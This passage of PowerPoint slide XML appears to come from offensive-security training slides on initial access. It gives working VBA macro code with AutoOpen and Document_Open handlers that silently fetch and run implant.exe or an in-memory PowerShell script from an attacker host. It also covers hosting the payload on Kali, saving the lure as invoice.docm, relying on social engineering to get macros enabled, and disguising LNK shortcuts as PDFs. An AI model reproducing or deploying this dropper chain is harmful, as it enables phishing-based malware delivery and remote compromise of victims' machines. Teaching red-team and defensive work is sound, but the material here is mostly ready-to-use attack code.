                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>This dynamically compiles the implant per session with unique encryption keys, making it more evasive.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4263554502"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1989255">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>PowerShell (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Fileless</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>No file is generated. Instead, you serve implant.ps1 with IEX and your macro calls IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker_ip&gt;/implant.ps1')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>This is the most stealthy method, as the payload runs directly in memory, leaving no trace on the disk.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3705403864"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28409686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412980" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Start a web server in the same folder:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>linux</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>sudo python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> 80</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The file is now accessible at: http://&lt;YOUR_KALI_IP&gt;/implant.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>2. Create the macro‑enabled document (Word or Excel)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Open Word (or Excel) on your Windows VM.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Press Alt + F11 to open the VBA editor.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>On the left, right‑click on the project (e.g., Project (Document1)) → Insert → Module.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Paste the following VBA code (replace 192.168.1.100 with your Kali IP):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Sub AutoOpen()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>RunShellcode</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>End Sub</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Sub </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Document_Open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>RunShellcode</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>End Sub</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Sub </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>RunShellcode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>vbHide</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>End Sub</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 1"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="90100"/>
            <a:ext cx="65" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15151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734771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A95F25-1847-97D5-635B-0D7F04B5D273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="103239" y="0"/>
            <a:ext cx="12241161" cy="6961239"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Dim </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> As String</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    ' Downloads implant.exe from Kali and executes it silently</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> = "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>WindowStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Hidden -Command ""(New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>('http://192.168.1.100/implant.exe', '%TEMP%\implant.exe'); Start-</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Process '%TEMP%\implant.exe’”””</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Close the VBA editor.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Save the file as macro‑enabled:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Word: File → Save As → Word Macro-Enabled Document (*.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>docm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Excel: File → Save As → Excel Macro-Enabled Workbook (*.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>xlsm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Name it, e.g., invoice.docm</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15228073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
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>3. Test the full chain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Transfer the .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>docm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (or .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>xlsm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>) to a target Windows VM.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Double‑click to open it. If macros are blocked, click Enable Content (in a real phishing attack, you rely on social engineering).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>On your Kali terminal, you will see a GET /implant.exe request.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Your C2 listener (e.g., Sliver, Metasploit, or Havoc) will receive a new session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>🔁 Optional: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Fileless</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> version (no EXE written to disk)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>If your implant is a PowerShell script (shellcode.ps1), use this </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>RunShellcode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> instead:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Sub </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>RunShellcode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    Dim </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> As String</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> = "powershell -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/shellcode.ps1')"""</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    Shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>vbHide</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>End Sub</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Then host shellcode.ps1 on Kali and enjoy a purely memory‑resident payload.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2030730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390120" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Part 2 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>LNK Files:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Create a malicious </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Shortcut (.LNK)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> file that uses PowerShell to execute a hidden command in the background.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>A .lnk (Windows shortcut) is a small, natively trusted metadata file.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>LNK files (also called Windows shortcut files) are small files with the .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>lnk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> extension that point to another file, folder, or program on your computer. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> Attackers exploit this by setting its Target field(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>what gets executed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> when you double-click it.) to a legitimate "Living off the Land" binary (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>LOLBin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) like powershell.exe. By default, the .lnk extension is hidden in Windows Explorer, making a file named </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>Invoice.pdf.lnk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> visually appear as a harmless PDF. When the user double-clicks it, the file executes its hidden PowerShell payload in a hidden window</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3910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DE8A89-DB10-47F2-92D4-E7E1AA20908F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="176981" y="0"/>
            <a:ext cx="12432890" cy="7270955"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Method 1 – Manual Construction with PowerShell (Recommended)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
